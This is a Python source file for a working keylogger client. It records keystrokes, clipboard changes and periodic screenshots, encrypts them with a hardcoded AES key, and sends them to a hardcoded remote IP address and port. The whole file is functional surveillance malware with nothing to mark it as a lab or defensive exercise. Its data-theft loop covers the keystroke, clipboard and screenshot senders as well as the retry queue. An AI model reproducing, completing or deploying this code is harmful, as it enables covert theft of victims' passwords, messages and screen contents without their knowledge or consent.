# --- CLIENT.PY ----------------------------------------------------------- #
# This script captures keyboard inputs, clipboard contents and periodic     #
# screenshots. It then sends data encrypted to another machine (server.py). #
# ------------------------------------------------------------------------- #

import socket
import threading
import time
import base64
import struct
import queue
import signal
import sys
import io
from datetime import datetime
from Crypto.Cipher.AES import new, MODE_CBC, block_size
from Crypto.Util.Padding import pad
from pynput import keyboard
from pynput.keyboard import Key
from PIL import ImageGrab
from pyperclip import paste

# --- CONFIGURATION SETTINGS ------------------------------------------------------------------------------ #
SECRET_KEY   = b'w\xd7\xc9=0\x17\xd1{\xe3\xc7{\x1a"\x8d\xa7\xb19\x87e\xb7gTQ\x98R\xed\xf2\x90\xbc\xfb2\xd2' #
IV           = b'\xed>\x86\x98\xed\xe5%\x99\x91\xe9r\x8b\t\xe3\xf2\xd2'                                     #
HOST, PORT   = '107.189.21.156', 43558                                                                      #
IMG_QUALITY  = 70                                                                                           #
KEY_INTERVAL = 45  # Keystrokes: sent every 45s if changed                                                  #
IMG_INTERVAL = 90  # Screenshots: sent every 90s if changed                                                 #
# --------------------------------------------------------------------------------------------------------- #

# Global variables for managing program state
key_queue     = queue.Queue()  # Stores captured keystrokes before sending
send_queue    = queue.Queue()  # Stores failed sends for retry attempts
stop_event    = threading.Event()  # Signal to tell threads when to stop
shift_active  = False  # Tracks if Shift key is currently pressed
caps_lock     = False  # Tracks Caps Lock state

# Numpad map for pynput
numpad_map = {
    96:'0',97:'1',98:'2',99:'3',100:'4',
    101:'5',102:'6',103:'7',104:'8',105:'9',
    110:'.',107:'+',109:'-',106:'*',111:'/'
}


def encrypt_data(data):
    """
    Encrypts data using AES-256 in CBC mode with PKCS7 padding.
    :param data: The plaintext string to encrypt
    :return: Base64-encoded encrypted data
    """
    cipher = new(SECRET_KEY, MODE_CBC, IV)
    raw = data.encode()
    padded = pad(raw, block_size)
    ct = cipher.encrypt(padded)

    return base64.b64encode(ct)


def send_data(data):
    """
    Sends encrypted data to the receiver server.
    :param data: The plaintext string to send
    :return: True if send succeeded, False if failed
    """
    cipher = new(SECRET_KEY, MODE_CBC, IV)
    padded_data = pad(data.encode(), block_size)
    encrypted = cipher.encrypt(padded_data)
    b64_encrypted = base64.b64encode(encrypted)

    # Network protocol: first send 4-byte length, then the actual data
    msg = struct.pack('>I', len(b64_encrypted)) + b64_encrypted
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(msg)
    return True



def periodic_sender():
    """
    Background thread that periodically sends collected data to the server.
    Handles keystroke data and screenshots with separate intervals.
    """
    last_key_time = time.time()
    last_img_time = time.time()
    key_buffer = []
    last_img_bytes = None

    while not stop_event.is_set():
        # Gather all available keystrokes
        try:
            while True:
                key_buffer.append(key_queue.get_nowait())
        except queue.Empty:
            pass

        now = time.time()

        # 1) Send keystrokes if interval elapsed and buffer changed
        if key_buffer and (now - last_key_time) >= KEY_INTERVAL:
            ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            payload = f"KEY|{ts}|{''.join(key_buffer)}"
            try:
                if not send_data(payload):
                    raise Exception("Silent failure")
            except Exception as e:
                print(f"[!] Failed to send keystrokes: {e}")
                send_queue.put(payload)
            key_buffer.clear()
            last_key_time = now

        # Retry any failed sends
        try:
            while True:
                pending = send_queue.get_nowait()
                if not send_data(pending):
                    send_queue.put(pending)
                    break
        except queue.Empty:
            pass

        # 2) Capture and send screenshot if interval elapsed and changed
        if (now - last_img_time) >= IMG_INTERVAL:
            ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format='JPEG', quality=IMG_QUALITY)
            this_bytes = buf.getvalue()

            if this_bytes != last_img_bytes:
                b64 = base64.b64encode(this_bytes).decode('utf-8')
                payload = f"IMG|{ts}|{b64}"
                try:
                    if not send_data(payload):
                        raise Exception("Silent failure")
                except Exception as e:
                    print(f"[!] Failed to send screenshot: {e}")
                    send_queue.put(payload)
                last_img_bytes = this_bytes
            last_img_time = now

        time.sleep(1)


def clipboard_monitor():
    """
    Monitors clipboard and sends content immediately upon change.
    """
    last_clip = paste()

    while not stop_event.is_set():
            current = paste()
            if current != last_clip:
                ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                b64 = base64.b64encode(current.encode('utf-8')).decode('utf-8')
                payload = f"CLP|{ts}|{b64}"
                try:
                    if not send_data(payload):
                        raise Exception("Silent failure")
                except Exception as e:
                    print(f"[!] Failed to send clipboard: {e}")
                    send_queue.put(payload)
                last_clip = current

            time.sleep(1)


def get_char(key):
    """
    Converts keyboard key presses into readable characters.
    :param key: The key event from pynput
    :return: The character representation of the key press
    """
    global shift_active, caps_lock
    if key == Key.caps_lock:
        caps_lock = not caps_lock
        return ''
    if key in (Key.shift, Key.shift_r):
        shift_active = True
        return ''
    if key == Key.esc:
        return '<ESC>'

    # Determine uppercase state
    uppercase = caps_lock ^ shift_active
    # Handle numpad keys
    if hasattr(key, 'vk') and key.vk in numpad_map:
        return numpad_map[key.vk]

    # Handle regular characters
    c = getattr(key, 'char', None)
    if c:
        return c.upper() if uppercase and c.isalpha() else c

    # Handle special keys
    special = {
        Key.space:' ', Key.enter:'\n', Key.tab:'\t',
        Key.backspace:'\b', Key.delete:'<DEL>',
        Key.right:'<RIGHT>', Key.left:'<LEFT>'
    }
    return special.get(key, '')


def on_press(key):
    """Callback for keyboard key press events."""
    ch = get_char(key)
    if ch:
        key_queue.put(ch)


def on_release(key):
    """Callback for keyboard key release events."""
    global shift_active
    if key in (Key.shift, Key.shift_r):
        shift_active = False


def shutdown(signum, frame):
    """Clean shutdown handler for SIGINT (Ctrl+C)."""
    stop_event.set()
    sys.exit(0)


if __name__ == '__main__':
    # Set up signal handler for clean shutdown
    signal.signal(signal.SIGINT, shutdown)

    # Start background sender and clipboard-monitor threads
    threading.Thread(target=periodic_sender, daemon=True).start()
    threading.Thread(target=clipboard_monitor, daemon=True).start()

    # Start listening to keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
